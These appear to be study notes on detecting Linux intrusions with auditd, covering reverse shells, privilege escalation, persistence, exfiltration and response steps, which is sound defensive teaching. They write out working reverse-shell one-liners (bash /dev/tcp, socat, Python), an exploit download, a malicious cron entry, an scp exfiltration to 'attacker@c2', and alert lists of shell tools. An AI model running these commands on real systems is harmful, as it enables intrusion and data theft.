
# Reverse shells — what & why

- **What:** Reverse shell = victim opens a connection back to attacker and spawns a shell (victim → attacker).
    
- **Why attackers use them:** bypass web/exploit I/O limits (no Ctrl+C, timeouts, truncated output), get an interactive shell, upload tools, pivot and escalate.
    
- **Common commands/examples:**
    
    - `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1` (native bash TCP)
        
    - `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` (socat)
        
    - `python3 -c '... s.connect(("10.30.30.30",80)); pty.spawn("bash")'` (Python)
        

# Detection: reverse shells (auditd + process tracing)

- **Why detectable:** reverse-shell creation spawns processes (socat, python, bash, nc) and performs network connects + execs.
    
- **Primary tool:** `auditd` (ausearch) — log execs and file/process activity.
    
- **Quick hunt commands:**
    
    - `ausearch -i -x socat` → find socat execs.
        
    - `ausearch -i --pid <pid>` → examine parent/child relationships.
        
    - `ausearch -i --ppid <pid>` → list commands executed from spawned shell (child processes).
        
- **Signs to alert on:** exec of network-capable binaries with `EXEC:` in proctitle (socat, python, bash, nc), sudden interactive commands from service accounts, network connections to rare external IPs/ports.
    

# Tracing origin & activity (process tree method)

- **Process-tree approach:** start from suspicious process → move up (ppid) to find origin → move down (ppid/--ppid) to list activity.
    
- **What to extract:** parent exe path, UID/auid, timestamps, child commands (`id`, `uname -a`, `ls`, etc.), network endpoints.
    

# Privilege escalation — basics & indicators

- **Goal:** move from low-priv (web/service account) → root. Methods include exploits, SUID abuse, credential reuse.
    
- **Typical sequence to detect:** Discovery spike → download/compile exploit → run exploit → post-exploit root commands → exfiltrate.
    
- **Common indicators:**
    
    - Discovery spike: many `whoami`, `id`, `uname -a`, `ps aux`, `crontab -l`.
        
    - Download/compile: `wget http://.../exploit.c -O /tmp/exploit.c`, `gcc /tmp/exploit.c -o /tmp/exploit`
        
    - SUID binary use: `find / -perm -4000 -type f` then exec of suspicious SUID tools.
        
    - Sudden UID change in audit logs: child process shows `uid=root` where parent was an unprivileged `uid=serviceuser`.
        
- **Auditd pattern:** `ausearch -i -x pwnkit` then `ausearch -i --ppid <pid>` to confirm shell spawned as root.
    

# Persistence — categories & detection

- **Categories:** Startup persistence (cron, systemd), account persistence (new users, SSH keys), application persistence (web backdoors).
    
- **Cron persistence:** cron files modified or new cron.d entries. Watch `/var/spool/cron/*`, `/etc/cron.d/*`, `/etc/crontab`.
    
    - Example malicious cron: `@reboot nohup /home/<user>/.hidden/malware > /dev/null 2>&1 &`
        
    - Detection: audit filesystem changes + watch `crontab -e` or `crontab` execs.
        
- **Systemd persistence:** attackers add `.service` files under `/etc/systemd/system` or `/lib/systemd/system`.
    
    - Watch for `systemctl enable/start`, edits to those folders, and `openat`/create events on `.service` files.
        
    - Example: `vi /etc/systemd/system/malicious.service` (auditd will show file event + proctitle).
        
- **Account persistence:**
    
    - **New user:** `useradd` / `usermod` entries in auth.log => new accounts, GID/UID assignment, sudo group additions.
        
    - **Backdoored SSH keys:** changes to `~/.ssh/authorized_keys` — hard to detect by process exec because echo is builtin; best is to audit the file itself (`-f ~/.ssh/authorized_keys`).
        
- **Application (web) persistence:** backdoors or web shells inside app files — often invisible to auditd if attacker edits through the web app. Use file integrity monitoring (FIM) and web app scanning.
    
![[Pasted image 20251111131815.png]]

# Detecting persistence with auditd (practical)

- **Files to monitor:**
    
    - Cron: `/etc/crontab`, `/etc/cron.d/*`, `/var/spool/cron/*`
        
    - Systemd: `/etc/systemd/system/*`, `/lib/systemd/system/*`
        
    - SSH keys: `/home/*/.ssh/authorized_keys`
        
- **Processes to watch:** `crontab`, `systemctl`, editors (`vi`, `nano`) being run by non-admin accounts editing system files.
    
- **Audit examples:**
    
    - `ausearch -i -f /etc/systemd` → file create/modify events.
        
    - `ausearch -i -x crontab` → crontab edits.
        

# Post-escalation behaviors to detect

- **Discovery as root:** `whoami` -> `root`, `tar czf /root/dump.tar.gz /root /etc`, `scp dump.tar.gz attacker@c2:~` — exfil via `scp` or `curl`/`wget` to C2.
    
- **Exfiltration indicators:** large archive creation, outbound SSH/SCP/FTP/HTTPS to novel IPs, scheduled recurring downloads from pastebin/paste sites.
    

# Targeted attacks & impact (short)

- **Linux as entry point:** public-facing Linux servers (web, mail, firewall, hypervisors) are high-value. One Linux hypervisor compromise can expose many VMs.

![[Pasted image 20251111131840.png]]

- **Espionage example:** attackers may favor systemd persistence and stealthy backdoors (e.g., Kimsuky APT).

![[Pasted image 20251111131850.png]]

- **Ransomware:** Linux-targeting ransomware (and hypervisor attacks) can cause catastrophic multi-VM outages.

![[Pasted image 20251111131859.png]]


# Response playbook (quick steps)

1. **Contain:** block suspicious external IPs + ports at perimeter; isolate host from network.
    
2. **Preserve:** collect `ausearch` output, `/var/log/auth.log`, `/var/log/syslog`, and copy of `/etc/systemd/system` and relevant cron files.
    
3. **Map:** build process tree from detected suspicious PID → parent → origin → children (use `ausearch` with `--pid` and `--ppid`).
    
4. **Verify:** check `auid`/`uid` changes to confirm privilege escalation.
    
5. **Remove persistence:** remove cron entries, disable and remove malicious systemd services, remove attacker SSH keys, delete created accounts (only after forensics).
    
6. **Hunt for app backdoors:** scan web directories for new/modified files and suspicious JS/PHP/Python shells.
    
7. **Rebuild/patch:** after full cleanup and root cause analysis, patch vulnerable software and rotate keys/passwords.
    

# Practical SOC rules & hunts (suggested)

- **Alert on execs:** `socat`, `nc`, `ncat`, `python` with `pty.spawn`, or `bash` launched with TCP redirection.
    
- **Alert on file changes:** new `.service` files under `/etc/systemd/system` or edited authorized_keys.
    
- **Alert on large outbound transfers:** `scp` to external hosts or long-lived HTTPS uploads to unknown IPs.
    
- **Baseline & FIM:** baseline system binaries and web directories; alert on unexpected writes.
    

# Short checklist for daily review

- Look for unexpected `systemctl enable` / new systemd files.
    
- Scan `/var/spool/cron` for new entries.
    
- Monitor `~/.ssh/authorized_keys` changes.
    
- Search audit logs for `socat|nc|python|bash` execs that originate from web/service accounts.
    
- Review authentication logs for new user creation / sudo group additions.
    

---

